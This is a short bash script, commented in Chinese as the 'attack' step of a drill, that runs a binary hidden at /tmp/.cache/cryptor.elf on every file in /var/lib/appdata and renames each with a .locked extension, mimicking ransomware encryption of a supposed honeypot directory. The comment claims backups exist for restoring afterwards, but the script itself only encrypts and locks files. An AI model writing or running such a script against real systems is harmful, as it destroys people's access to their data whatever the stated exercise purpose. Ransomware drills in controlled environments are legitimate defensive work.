#!/usr/bin/env bash
# attack（窗口内）：加密蜜罐目录并改扩展名（备份供演练后恢复）。
set -euo pipefail
for f in /var/lib/appdata/*; do
  /tmp/.cache/cryptor.elf "$f" && mv "$f" "$f.locked"
done
